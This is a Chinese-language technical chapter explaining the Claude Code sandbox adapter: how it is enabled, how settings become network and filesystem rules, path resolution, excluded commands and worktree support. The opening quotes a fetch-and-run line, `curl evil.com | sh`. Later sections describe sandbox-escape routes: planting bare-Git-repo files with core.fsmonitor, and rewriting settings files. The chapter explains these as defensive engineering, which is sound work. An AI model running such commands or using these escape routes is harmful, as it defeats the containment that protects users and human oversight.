
# 第 14 章：Sandbox 安全沙箱 — 纵深防御

> **核心问题**：当 Agent 执行 `bash -c "curl evil.com | sh"` 时，如何在操作系统层面阻止恶意行为？仅靠应用层权限检查够吗？

权限系统是"门卫"，决定哪些操作允许执行；但即使门卫放行了一个 `npm install`，这个命令可能暗中下载恶意包、修改系统文件、或向外泄露数据。**Sandbox 是"围墙"**，在操作系统层面限制进程的能力边界 — 即使命令被允许执行，也只能在沙箱限定的范围内操作。

Claude Code 的 Sandbox 系统基于 `@anthropic-ai/sandbox-runtime` 包，通过一个 **适配器层**（`sandbox-adapter.ts`）与 Claude Code 的设置系统、权限规则和工具集成深度整合。

---

## 14.1 架构概览

```
┌────────────────────────────────────────────────────┐
│                Claude Code 应用层                    │
│                                                      │
│  ┌────────────┐  ┌────────────┐  ┌──────────────┐  │
│  │ BashTool   │  │ 权限系统   │  │ 设置系统      │  │
│  │            │  │            │  │              │  │
│  │shouldUse   │  │ checkPerm  │  │ settings.json │  │
│  │Sandbox()   │  │ issions()  │  │ sandbox:{}   │  │
│  └──────┬─────┘  └──────┬─────┘  └──────┬───────┘  │
│         │               │               │           │
│  ┌──────▼───────────────▼───────────────▼────────┐  │
│  │         SandboxManager (adapter)               │  │
│  │  sandbox-adapter.ts                            │  │
│  │  ┌──────────────────────────────────────────┐  │  │
│  │  │ convertToSandboxRuntimeConfig()          │  │  │
│  │  │ resolvePathPatternForSandbox()           │  │  │
│  │  │ wrapWithSandbox()                        │  │  │
│  │  │ initialize() / refreshConfig()           │  │  │
│  │  └──────────────────────────────────────────┘  │  │
│  └──────────────────────┬────────────────────────┘  │
│                         │                           │
└─────────────────────────┼───────────────────────────┘
                          │
┌─────────────────────────▼───────────────────────────┐
│           @anthropic-ai/sandbox-runtime              │
│                                                      │
│  ┌──────────────┐  ┌──────────────┐                 │
│  │ macOS:       │  │ Linux/WSL:   │                 │
│  │ Seatbelt     │  │ bubblewrap   │                 │
│  │ sandbox-exec │  │ (bwrap)      │                 │
│  │              │  │ + socat      │                 │
│  └──────────────┘  └──────────────┘                 │
│                                                      │
│  网络代理 ← HTTP/SOCKS → DNS 过滤 → 域名白名单       │
│  文件系统 ← ro-bind/rw-bind → 路径白名单/黑名单       │
└──────────────────────────────────────────────────────┘
```

> **设计决策**：Sandbox 实现分为两层 — `@anthropic-ai/sandbox-runtime` 是平台无关的沙箱运行时，`sandbox-adapter.ts` 是 Claude Code 特有的适配器。这使得沙箱运行时可以独立升级和测试，同时 Claude Code 可以通过适配器注入自己的设置和权限逻辑。

---

## 14.2 沙箱启用条件

### 多重检查链

```typescript
// src/utils/sandbox/sandbox-adapter.ts
function isSandboxingEnabled(): boolean {
  // 1. 平台支持检查（macOS / Linux / WSL2+）
  if (!isSupportedPlatform()) return false

  // 2. 依赖检查（bubblewrap / socat 等）
  if (checkDependencies().errors.length > 0) return false

  // 3. 平台是否在 enabledPlatforms 列表中
  if (!isPlatformInEnabledList()) return false

  // 4. 用户是否在设置中启用了 sandbox
  return getSandboxEnabledSetting()
}
```

### enabledPlatforms 限制

这是一个未公开的设置项，允许企业限制沙箱只在特定平台启用：

```typescript
// src/utils/sandbox/sandbox-adapter.ts
function isPlatformInEnabledList(): boolean {
  const settings = getInitialSettings()
  const enabledPlatforms = settings?.sandbox?.enabledPlatforms
  if (enabledPlatforms === undefined) return true       // 未设置则全部启用
  if (enabledPlatforms.length === 0) return false       // 空数组 = 全部禁用
  return enabledPlatforms.includes(getPlatform())
}
```

> **设计决策**：`enabledPlatforms` 是为 NVIDIA 等企业客户添加的 — 他们想在 macOS 上先启用 `autoAllowBashIfSandboxed`，等 Linux 沙箱更成熟后再扩展。

### 不可用时的用户反馈

v2.1 之后新增了显式的不可用原因报告：

```typescript
// src/utils/sandbox/sandbox-adapter.ts
function getSandboxUnavailableReason(): string | undefined {
  if (!getSandboxEnabledSetting()) return undefined  // 未启用就不报

  if (!isSupportedPlatform())
    return `sandbox.enabled is set but ${platform} is not supported`

  if (!isPlatformInEnabledList())
    return `sandbox.enabled is set but ${getPlatform()} is not in enabledPlatforms`

  const deps = checkDependencies()
  if (deps.errors.length > 0)
    return `sandbox.enabled is set but dependencies are missing: ${deps.errors.join(', ')}`

  return undefined
}
```

---

## 14.3 配置转换：从设置到沙箱运行时

`convertToSandboxRuntimeConfig()` 是核心转换函数，将 Claude Code 的设置格式转化为 `SandboxRuntimeConfig`：

### 网络限制

```typescript
// src/utils/sandbox/sandbox-adapter.ts
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const permissions = settings.permissions || {}
  const allowedDomains: string[] = []
  const deniedDomains: string[] = []

  // 当 allowManagedDomainsOnly 启用时，只使用 policy 的域名
  if (shouldAllowManagedSandboxDomainsOnly()) {
    const policySettings = getSettingsForSource('policySettings')
    for (const domain of policySettings?.sandbox?.network?.allowedDomains || [])
      allowedDomains.push(domain)
    // 从 policy 的 WebFetch allow 规则中提取域名
    for (const ruleString of policySettings?.permissions?.allow || []) {
      const rule = permissionRuleValueFromString(ruleString)
      if (rule.toolName === WEB_FETCH_TOOL_NAME
          && rule.ruleContent?.startsWith('domain:'))
        allowedDomains.push(rule.ruleContent.substring('domain:'.length))
    }
  } else {
    // 从所有设置源的 WebFetch 规则中提取
    for (const domain of settings.sandbox?.network?.allowedDomains || [])
      allowedDomains.push(domain)
    for (const ruleString of permissions.allow || []) {
      const rule = permissionRuleValueFromString(ruleString)
      if (rule.toolName === WEB_FETCH_TOOL_NAME
          && rule.ruleContent?.startsWith('domain:'))
        allowedDomains.push(rule.ruleContent.substring('domain:'.length))
    }
  }
  // ...
}
```

### 文件系统限制

```typescript
  // 始终允许当前目录和临时目录写入
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []

  // **安全关键**：永远禁止写入 settings.json 文件
  // 防止沙箱内的命令修改设置来逃逸沙箱
  const settingsPaths = SETTING_SOURCES.map(source =>
    getSettingsFilePathForSource(source)
  ).filter((p): p is string => p !== undefined)
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())

  // 禁止写入 .claude/skills（与 commands/agents 同等保护级别）
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
```

### 裸 Git 仓库攻击防护

一个精心构造的攻击可以让沙箱内的命令在 cwd 中创建看起来像裸 Git 仓库的文件，然后利用 `core.fsmonitor` 来逃逸：

```typescript
  // SECURITY: 防止沙箱逃逸 via 裸 Git 仓库
  // git 的 is_git_directory() 在 cwd 有 HEAD + objects/ + refs/ 时会
  // 将 cwd 当做裸仓库。攻击者可以植入这些文件（加上 config 中的
  // core.fsmonitor）在 Claude 的非沙箱 git 运行时逃逸。
  bareGitRepoScrubPaths.length = 0
  const bareGitRepoFiles = ['HEAD', 'objects', 'refs', 'hooks', 'config']
  for (const dir of cwd === originalCwd ? [originalCwd] : [originalCwd, cwd]) {
    for (const gitFile of bareGitRepoFiles) {
      const p = resolve(dir, gitFile)
      try {
        statSync(p)         // 文件已存在 → deny write（ro-bind）
        denyWrite.push(p)
      } catch {
        bareGitRepoScrubPaths.push(p)  // 文件不存在 → 命令后清理
      }
    }
  }
```

> **设计决策**：存在的文件用 read-only bind mount 保护，不存在的文件在命令执行后清理（`scrubBareGitRepoFiles()`）。这种策略避免了在 /dev/null 挂载时产生的副作用。

---

## 14.4 路径模式解析

Claude Code 有自己的路径前缀约定：

```typescript
// src/utils/sandbox/sandbox-adapter.ts

// 权限规则中的路径：
// //path → 绝对路径（从文件系统根开始）
// /path  → 相对于设置文件所在目录
// ~/path → 传递给 sandbox-runtime 处理
export function resolvePathPatternForSandbox(
  pattern: string, source: SettingSource
): string {
  if (pattern.startsWith('//'))
    return pattern.slice(1)          // "//.aws/**" → "/.aws/**"
  if (pattern.startsWith('/') && !pattern.startsWith('//')) {
    const root = getSettingsRootPathForSource(source)
    return resolve(root, pattern.slice(1))  // "/foo/**" → "${root}/foo/**"
  }
  return pattern                     // 其他模式原样传递
}

// sandbox.filesystem.* 设置中的路径（不同语义！）：
// /path  → 绝对路径（不是相对于设置目录）
// ~/path → 展开到 home 目录
export function resolveSandboxFilesystemPath(
  pattern: string, source: SettingSource
): string {
  if (pattern.startsWith('//')) return pattern.slice(1)
  return expandPath(pattern, getSettingsRootPathForSource(source))
}
```

> **设计决策**：权限规则和沙箱文件系统配置对 `/path` 有不同的语义 — 前者相对于设置文件目录，后者是绝对路径。这个不一致的设计后来引起了 issue #30067，`resolveSandboxFilesystemPath()` 就是为修复这个问题而添加的。

---

## 14.5 ISandboxManager 接口

`SandboxManager` 暴露了完整的沙箱管理接口：

```typescript
// src/utils/sandbox/sandbox-adapter.ts
export interface ISandboxManager {
  // 初始化和状态
  initialize(sandboxAskCallback?: SandboxAskCallback): Promise<void>
  isSupportedPlatform(): boolean
  isSandboxingEnabled(): boolean
  isSandboxRequired(): boolean
  getSandboxUnavailableReason(): string | undefined
  checkDependencies(): SandboxDependencyCheck

  // 配置查询
  getFsReadConfig(): FsReadRestrictionConfig
  getFsWriteConfig(): FsWriteRestrictionConfig
  getNetworkRestrictionConfig(): NetworkRestrictionConfig
  getExcludedCommands(): string[]

  // 核心操作
  wrapWithSandbox(command: string, binShell?: string,
    customConfig?: Partial<SandboxRuntimeConfig>,
    abortSignal?: AbortSignal): Promise<string>
  cleanupAfterCommand(): void     // 含 scrubBareGitRepoFiles()
  refreshConfig(): void           // 设置变更后刷新

  // 设置管理
  areSandboxSettingsLockedByPolicy(): boolean
  setSandboxSettings(options: { enabled?: boolean; ... }): Promise<void>
}
```

### 初始化流程

```typescript
async function initialize(sandboxAskCallback?: SandboxAskCallback) {
  if (initializationPromise) return initializationPromise
  if (!isSandboxingEnabled()) return

  // 包装回调以强制执行 allowManagedDomainsOnly 策略
  const wrappedCallback = sandboxAskCallback
    ? async (hostPattern) => {
        if (shouldAllowManagedSandboxDomainsOnly()) return false
        return sandboxAskCallback(hostPattern)
      }
    : undefined

  initializationPromise = (async () => {
    // 检测 git worktree 主仓库路径（一次性缓存）
    if (worktreeMainRepoPath === undefined)
      worktreeMainRepoPath = await detectWorktreeMainRepoPath(getCwdState())

    const settings = getSettings_DEPRECATED()
    const runtimeConfig = convertToSandboxRuntimeConfig(settings)
    await BaseSandboxManager.initialize(runtimeConfig, wrappedCallback)

    // 订阅设置变化以动态更新沙箱配置
    settingsSubscriptionCleanup = settingsChangeDetector.subscribe(() => {
      const newConfig = convertToSandboxRuntimeConfig(getSettings_DEPRECATED())
      BaseSandboxManager.updateConfig(newConfig)
    })
  })()
}
```

---

## 14.6 Excluded Commands 与 autoAllowBashIfSandboxed

### 排除命令

某些命令不应在沙箱中运行（如需要 Docker 权限的命令），通过 `excludedCommands` 配置：

```typescript
function getExcludedCommands(): string[] {
  return getSettings_DEPRECATED()?.sandbox?.excludedCommands ?? []
}

export function addToExcludedCommands(
  command: string,
  permissionUpdates?: Array<{ type: string; rules: ... }>
): string {
  // 从权限建议中提取命令前缀
  let commandPattern = command
  if (permissionUpdates) {
    const bashSuggestions = permissionUpdates.filter(
      update => update.type === 'addRules'
        && update.rules.some(rule => rule.toolName === BASH_TOOL_NAME)
    )
    // 提取如 "npm run test:*" 中的 "npm run test" 前缀
    // ...
  }
  // 写入 localSettings
  updateSettingsForSource('localSettings', {
    sandbox: { excludedCommands: [...existing, commandPattern] }
  })
  return commandPattern
}
```

### autoAllowBashIfSandboxed

当沙箱启用且 `autoAllowBashIfSandboxed` 为 true 时（默认值），在沙箱内运行的 Bash 命令会跳过权限检查中的 `ask` 规则。这与权限系统的交互在第 13 章 1b 步骤中体现：

```typescript
// 在 hasPermissionsToUseToolInner() 中
const canSandboxAutoAllow =
  tool.name === BASH_TOOL_NAME &&
  SandboxManager.isSandboxingEnabled() &&
  SandboxManager.isAutoAllowBashIfSandboxedEnabled() &&
  shouldUseSandbox(input)

if (!canSandboxAutoAllow) {
  return { behavior: 'ask', ... }
}
// 如果沙箱可以自动允许，跳过 ask 规则继续到 checkPermissions
```

---

## 14.7 Worktree 支持

Git worktree 需要写入主仓库的 `.git` 目录（如 `index.lock`），沙箱需要特别处理：

```typescript
async function detectWorktreeMainRepoPath(cwd: string): Promise<string | null> {
  const gitPath = join(cwd, '.git')
  const gitContent = await readFile(gitPath, { encoding: 'utf8' })
  // 在 worktree 中，.git 是文件，内容为 "gitdir: /path/to/main/.git/worktrees/name"
  const gitdirMatch = gitContent.match(/^gitdir:\s*(.+)$/m)
  if (!gitdirMatch?.[1]) return null

  const gitdir = resolve(cwd, gitdirMatch[1].trim())
  const marker = `${sep}.git${sep}worktrees${sep}`
  const markerIndex = gitdir.lastIndexOf(marker)
  if (markerIndex > 0) return gitdir.substring(0, markerIndex)
  return null
}
```

检测结果缓存在 `worktreeMainRepoPath` 中，并在配置构建时添加到 allowWrite 列表。

---

## 章末速查表

| 概念 | 文件 | 关键函数 |
|------|------|---------|
| 适配器层 | `sandbox-adapter.ts` | `SandboxManager` 对象 |
| 启用检查 | `sandbox-adapter.ts` | `isSandboxingEnabled()` |
| 配置转换 | `sandbox-adapter.ts` | `convertToSandboxRuntimeConfig()` |
| 路径解析 | `sandbox-adapter.ts` | `resolvePathPatternForSandbox()` |
| 文件系统路径 | `sandbox-adapter.ts` | `resolveSandboxFilesystemPath()` |
| 裸仓库防护 | `sandbox-adapter.ts` | `scrubBareGitRepoFiles()` |
| 排除命令 | `sandbox-adapter.ts` | `addToExcludedCommands()` |
| Worktree | `sandbox-adapter.ts` | `detectWorktreeMainRepoPath()` |
| 策略锁定 | `sandbox-adapter.ts` | `areSandboxSettingsLockedByPolicy()` |
| 域名管控 | `sandbox-adapter.ts` | `shouldAllowManagedSandboxDomainsOnly()` |
| 不可用原因 | `sandbox-adapter.ts` | `getSandboxUnavailableReason()` |
| 设置变更监听 | `sandbox-adapter.ts` | `settingsChangeDetector.subscribe()` |
